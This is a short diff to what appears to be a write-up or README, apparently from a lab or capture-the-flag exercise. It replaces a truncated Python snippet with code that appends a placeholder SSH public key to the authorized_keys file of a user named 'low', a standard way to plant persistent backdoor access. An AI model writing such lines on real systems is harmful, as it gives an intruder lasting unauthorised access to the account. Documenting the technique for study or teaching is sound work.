@@ -15,5 +15,6 @@ source <path-to-active-bin-in-venv>
 ```python
 try:
 	print('anystring')
-	with p
+	with open('/home/low/.ssh/authorized_keys','a') as f:
+		f.writelines('<ssh-public-key>')
 ```
